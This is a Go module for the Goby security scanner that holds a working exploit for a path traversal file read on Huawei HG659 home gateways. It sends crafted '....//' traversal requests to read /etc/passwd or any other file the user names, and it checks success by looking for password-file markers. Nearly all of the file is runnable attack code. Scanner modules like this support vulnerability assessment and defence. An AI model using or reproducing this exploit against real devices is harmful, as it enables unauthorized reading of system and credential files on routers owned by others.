package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Huawei home gateway HG659 fileread",
    "Description": "Huawei home gateway HG659 fileread",
    "Product": "Huawei",
    "Homepage": "https://support.huawei.com/enterprise/en/access-network",
    "DisclosureDate": "2021-06-16",
    "Author": "Print1n",
    "GobyQuery": "body=\"HUAWEI Home Gateway\"",
    "Level": "1",
    "Impact": "<p>File read</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4210"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "//etc//passwd"
        }
    ],
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "File read"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Huawei"
        ]
    },
    "PocId": "10212"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/lib///....//....//....//....//....//....//....//....//etc//passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:") && strings.Contains(resp.RawBody, ":/bin")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["file"].(string)
			uri := "/lib///....//....//....//....//....//....//....//...." + file
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
